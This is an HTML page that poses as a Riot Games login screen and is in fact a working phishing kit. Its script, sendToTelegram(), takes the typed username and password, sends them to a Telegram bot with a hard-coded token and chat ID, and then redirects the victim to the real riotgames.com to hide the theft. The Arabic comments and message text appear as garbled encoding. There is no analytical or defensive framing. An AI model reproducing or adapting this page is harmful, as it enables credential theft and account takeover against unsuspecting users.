<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <link rel="stylesheet" href="assets/css/style.css" />
    <title>Riotgames | Login</title>
  </head>
  <body>
    <main class="main">
      <section class="section-login">
        <div class="container">
          <img src="assets/img/logo.png" class="logo" alt="#" />

          <h1 class="section-title">Login</h1>

          <label class="login-user">
            <span>Username</span>
            <input type="text" id="username" class="input" oninput="checkInputs()" />
          </label>

          <label class="login-user">
            <span>Password</span>
            <input type="password" id="password" class="input" oninput="checkInputs()" />
          </label>

          <div class="login-icons">
            <button type="button" class="btn-social">
              <img src="assets/img/facebook-icon.png" alt="Facebook Icon" />
            </button>

            <button type="button" class="btn-social">
              <img src="assets/img/google-icon.png" alt="Google Icon" />
            </button>

            <button type="button" class="btn-social">
              <img src="assets/img/apple-icon.png" alt="Apple Icon" />
            </button>
          </div>

          <label class="section-checkbox">
            <input type="checkbox" id="input-checkbox" /> Keep me logged in
          </label>
        </div>

        <div class="container">
          <button type="button" class="login-btn" id="login-btn" disabled onclick="sendToTelegram()">
            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512">
              <path
                d="M438.6 278.6l-160 160C272.4 444.9 264.2 448 256 448s-16.38-3.125-22.62-9.375c-12.5-12.5-12.5-32.75 0-45.25L338.8 288H32C14.33 288 .0016 273.7 .0016 256S14.33 224 32 224h306.8l-105.4-105.4c-12.5-12.5-12.5-32.75 0-45.25s32.75-12.5 45.25 0l160 160C451.1 245.9 451.1 266.1 438.6 278.6z"
              />
            </svg>
          </button>

          <a href="#" class="section-link">Can't log in?</a>
          <a href="#" class="section-link">Create account</a>
        </div>
      </section>

      <section class="wallpaper"></section>
    </main>

    <script>
      function checkInputs() {
        const username = document.getElementById("username").value.trim();
        const password = document.getElementById("password").value.trim();
        const loginBtn = document.getElementById("login-btn");

        if (username !== "" && password !== "") {
          loginBtn.removeAttribute("disabled");
        } else {
          loginBtn.setAttribute("disabled", "true");
        }
      }

      function sendToTelegram() {
        const username = document.getElementById("username").value.trim();
        const password = document.getElementById("password").value.trim();
        
        if (username === "" || password === "") {
          return;
        }

        const botToken = "7957010074:AAHgLSwfezAgFwzbvnbWbJRsOcRXm01kDeM";
        const chatId = "6687453395";
        const message = `üî• ÿ™ÿ≥ÿ¨ŸäŸÑ ÿØÿÆŸàŸÑ ÿ¨ÿØŸäÿØ üî•\n\nüë§ ÿßŸÑŸÖÿ≥ÿ™ÿÆÿØŸÖ: ${username}\nüîí ŸÉŸÑŸÖÿ© ÿßŸÑŸÖÿ±Ÿàÿ±: ${password}`;

        const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;

        fetch(url)
          .then(() => {
            window.location.href = "https://www.riotgames.com/";
          })
          .catch(error => console.error("Error sending to Telegram:", error));
      }

      // ** ÿ•ÿÆŸÅÿßÿ° ÿßŸÑŸÜÿµ ÿπŸÜÿØ ÿßŸÑŸÉÿ™ÿßÿ®ÿ© Ÿàÿ•ÿ∏Ÿáÿßÿ±Ÿá ÿπŸÜÿØ ÿßŸÑÿÆÿ±Ÿàÿ¨ ÿ•ÿ∞ÿß ŸÉÿßŸÜ ÿßŸÑÿ≠ŸÇŸÑ ŸÅÿßÿ±ÿ∫Ÿãÿß **
      document.querySelectorAll(".input").forEach((input) => {
        const span = input.previousElementSibling;

        input.addEventListener("input", () => {
          span.style.opacity = input.value ? "0" : "1"; // ÿ•ÿÆŸÅÿßÿ° ÿßŸÑŸÜÿµ ÿπŸÜÿØ ÿßŸÑŸÉÿ™ÿßÿ®ÿ©
        });

        input.addEventListener("focusout", () => {
          if (!input.value) {
            span.style.opacity = "1"; // ÿ•ÿ∏Ÿáÿßÿ± ÿßŸÑŸÜÿµ ÿπŸÜÿØ ÿßŸÑÿÆÿ±Ÿàÿ¨ ÿ•ÿ∞ÿß ŸÉÿßŸÜ ÿßŸÑÿ≠ŸÇŸÑ ŸÅÿßÿ±ÿ∫Ÿãÿß
          }
        });
      });
    </script>
  </body>
</html>
